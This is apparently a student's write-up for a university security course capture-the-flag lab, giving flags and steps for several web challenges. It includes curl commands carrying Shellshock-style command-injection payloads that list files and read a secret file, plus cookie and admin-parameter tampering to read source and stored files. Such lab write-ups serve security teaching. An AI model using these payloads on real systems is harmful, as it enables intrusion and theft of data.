@@ -1,0 +1,30 @@
+Trevor Webster
+1227355118
+twebst10
+
+1. cd3d9cadf1ef30f7dc5802e823116310
+Viewed the source of file at http://pwnthemall.cse543.rev.fish:8081/cgi-bin/verify.js
+
+
+
+2. 41e33f8c6719f97e1ac00d745e6a25c5
+View javascript XML HTTP request URL. Use command injection on the query parameter 'filter'.
+https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock#:~:text=Request%20information%20e.g.%20query%20parameters%2C%20user%20agent%2C%20etc.%20is%20stored%20in%20environment%20variables.%20Standard%20output%20from%20the%20program%20is%20returned%20to%20the%20user%20as%20the%20HTTP%20response.
+curl -v -H "Referer: http://pwnthemall.cse543.rev.fish:8082/users.html" http://pwnthemall.cse543.rev.fish:8082/cgi-bin/users.php?filter=%28%29%20%7B%20%3A%3B%7D%3B%20echo%3B%20ls%3B%20cat%20secretuser.txt
+
+3. ba49a4555854299152eb44d2619bc5bf
+Observe the app behavior is to generate a value for ID when all other form fields are submitted. When the ID is submitted, the original comment is returned. 
+Use this fact to predict Mike's ID: Use Mike's values to generate his ID. Use his ID to get his comment.
+curl -v -H "Referer: http://pwnthemall.cse543.rev.fish:8083/41e33f8c6719f97e1ac00d745e6a25c5"  http://pwnthemall.cse543.rev.fish:8083/cgi-bin/petition.py?first=%28%29%20%7B%20%3A%3B%7D%3B%20echo%3B%20ls%3B%20ls%20..%2F%3B
+
+4. 9b87ecb29600dd01b9e32d2cd268a9a4
+Use the level02 vulnerability to do directory reading, to get a sense of the directories and files on this server. We only use the filename parameter to do file read not injection. 
+Find out what directory the app reads relative to. Use Burp Repeater to change POST form data and change filename form parameter.
+
+5. fdf1f06b0422dc2746c7daff964c5307
+On the /store page: Modify the Cookie header with the key blacklist=store or blacklist=retrieve, and set admin=1 in form data. This allows you to read the source files.
+Notice in retrieve the password that allows you to read all the files of all IDs in /tmp/ storage. Use this password with admin=1 to read all lines of all files with
+site=www.bank.com. curl then write output to file, read each line and filter for mike_pence.
+
+6.
+include a file that allows to retreive and list all files in directory of current process
